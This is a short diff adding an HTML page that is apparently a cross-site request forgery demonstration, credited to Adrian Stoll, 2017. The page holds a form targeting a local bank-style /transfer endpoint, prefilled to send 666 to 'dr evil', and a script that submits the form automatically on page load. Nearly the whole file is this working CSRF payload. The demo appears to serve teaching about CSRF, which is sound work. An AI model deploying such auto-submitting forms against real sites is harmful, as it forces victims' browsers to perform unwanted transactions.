@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+<body>
+	<form action="http://localhost:8080/transfer" method="post" id="form">
+		Destination account: <input type="text" name="dest" value="dr evil"/>
+		Transfer amount: <input type="number" name="amount" value="666" />
+		<input type="submit" value="Transfer" />
+	</form>
+	<script>
+		window.onload = function() {
+			document.getElementById('form').submit();
+			//check your balance now
+		}
+	</script>
+<hr>
+Written by Adrian Stoll on 27 May 2017
+</body>
+</html>
